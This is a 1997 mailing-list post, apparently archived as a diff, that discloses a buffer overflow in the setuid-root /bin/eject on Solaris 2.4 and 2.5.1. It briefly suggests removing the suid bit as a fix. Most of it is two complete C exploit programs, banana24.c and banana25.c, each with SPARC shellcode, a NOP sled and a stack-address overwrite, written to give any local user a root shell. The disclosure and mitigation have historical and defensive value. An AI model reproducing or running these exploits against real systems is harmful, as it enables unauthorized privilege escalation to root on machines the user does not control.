@@ -1,0 +1,168 @@
+From: Cristian SCHIPOR <skipo@sundy.cs.pub.ro>
+Date: Thu, 13 Mar 1997 11:18:53 -0800 (PST)
+To: cypherpunks@toad.com
+Subject: Exploit for buffer overflow in /bin/eject - Solaris 2.X
+Message-ID: <Pine.GSO.3.95.970313211648.23406C-100000@sundy.cs.pub.ro>
+MIME-Version: 1.0
+Content-Type: text/plain
+
+
+motto: "Mihai Eminescu was a good friend of Ion Creanga"
+
+Thu  Mar 13 21:01:00 EET 1997  - Romania
+
+"Hole in /bin/eject - buffer overflow"
+
+I exploited the buffer overflow hole in /bin/eject on Solaris 2.X (who
+have suid exec bit and is owned by root). The buffer overflow problem
+appears in an internal function media_find(). The result is: any user can 
+gain root shell. So, to prevent /bin/eject exploit, you have to get out 
+suid-exec bit from /bin/eject (that's very simple) and compile a little 
+program like:
+
+ main()
+ {execl("/bin/eject","eject","floppy",(char *)0);}
+ 
+That allows your work station ordinary users to eject floppy (thats the main 
+task for eject).
+
+I wrote two exploits (Solaris 2.4 & 2.5.1). My exploit for Solaris 2.4 
+looks a bit ugly - the buffer is two short - but it works.
+For both exploits argv[1] can change the STACK_OFFSET value (for 
+troubleshotings +- 8 .. +-64 .. the step is 8).
+The interesting thing about this exploit it worked on some machines where 
+it was installed some stuff to make inofensiv buffer overflows exploits ... 
+
+Ok you have right down two exploits.
+For future I'm planing a web page with security stuff for Solaris so try 
+http://www.math.pub.ro/security.
+
+Cristian Schipor - Computer Science Faculty - Bucharest - Romania
+E-mail: skipo@sundy.cs.pub.ro, skipo@math.pub.ro, skipo@ns.ima.ro
+Phone: 401-410.60.88
+
+------------------------ banana24.c -----------------------------
+/* For Solaris 2.4 */
+
+   #include <stdio.h>
+   #include <stdlib.h>
+   #include <sys/types.h>
+   #include <unistd.h>
+   
+   #define BUF_LENGTH 264
+   #define EXTRA 36
+   #define STACK_OFFSET 8
+   #define SPARC_NOP 0xc013a61c
+   
+   u_char sparc_shellcode[] =
+
+   "\xc0\x13\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+   "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+   "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+   "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+   "\x91\xd0"/*\x20\x08"*/
+   ;
+   
+   u_long get_sp(void)
+   {
+   __asm__("mov %sp,%i0 \n");
+   }
+   
+   void main(int argc, char *argv[])
+   {
+   char buf[BUF_LENGTH + EXTRA + 8];
+   long targ_addr;
+   u_long *long_p;
+   u_char *char_p;
+   int i, code_length = strlen(sparc_shellcode),dso=0;
+   
+   if(argc > 1) dso=atoi(argv[1]);
+   
+   long_p =(u_long *) buf ;
+   targ_addr = get_sp() - STACK_OFFSET - dso;
+   
+   for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+   *long_p++ = SPARC_NOP;
+   
+   char_p = (u_char *) long_p;
+   
+   for (i = 0; i < code_length; i++)
+   *char_p++ = sparc_shellcode[i];
+   
+   long_p = (u_long *) char_p;
+   
+   for (i = 0; i < EXTRA / sizeof(u_long); i++)
+   *long_p++ =targ_addr;
+   
+   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+   targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+   execl("/bin/eject", "eject", & buf,(char *) 0);
+   perror("execl failed");
+   }
+------------------------- end of banana24.c ------------------------
+
+------------------------- banana25.c -------------------------------
+/* Wrote for Solaris 2.5.1 */
+
+   #include <stdio.h>
+   #include <stdlib.h>
+   #include <sys/types.h>
+   #include <unistd.h>
+   
+   #define BUF_LENGTH 364
+   #define EXTRA 400
+   #define STACK_OFFSET 400
+   #define SPARC_NOP 0xa61cc013
+   
+   u_char sparc_shellcode[] =
+
+   "\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+   "\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+   "\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+   "\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+   "\x91\xd0\x20\x08"
+   ;
+   
+   u_long get_sp(void)
+   {
+   __asm__("mov %sp,%i0 \n");
+   }
+   
+   void main(int argc, char *argv[])
+   {
+   char buf[BUF_LENGTH + EXTRA + 8];
+   long targ_addr;
+   u_long *long_p;
+   u_char *char_p;
+   int i, code_length = strlen(sparc_shellcode),dso=0;
+   
+   if(argc > 1) dso=atoi(argv[1]);
+   
+   long_p =(u_long *) buf ;
+   targ_addr = get_sp() - STACK_OFFSET - dso;
+   for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+   *long_p++ = SPARC_NOP;
+   
+   char_p = (u_char *) long_p;
+   
+   for (i = 0; i < code_length; i++)
+   *char_p++ = sparc_shellcode[i];
+   
+   long_p = (u_long *) char_p;
+   
+   for (i = 0; i < EXTRA / sizeof(u_long); i++)
+   *long_p++ =targ_addr;
+   
+   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+   targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+   execl("/bin/eject", "eject", & buf[1],(char *) 0);
+   perror("execl failed");
+   }
+---------------------------- end of banana25.c ------------------------
+
+
+
+
+
+
+
